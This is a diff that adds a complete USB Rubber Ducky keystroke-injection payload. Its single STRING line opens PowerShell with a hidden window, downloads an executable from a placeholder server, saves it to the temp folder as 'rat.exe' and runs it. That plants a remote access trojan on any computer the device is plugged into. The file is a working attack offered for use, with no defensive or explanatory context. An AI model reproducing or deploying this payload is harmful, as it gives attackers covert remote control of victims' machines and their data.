@@ -1,0 +1,4 @@
+REM Rubber Ducky Payload
+DELAY 1000
+STRING powershell -w hidden -c "iwr http://yourserver/payload.exe -OutFile $env:temp\rat.exe; Start-Process $env:temp\rat.exe"
+ENTER
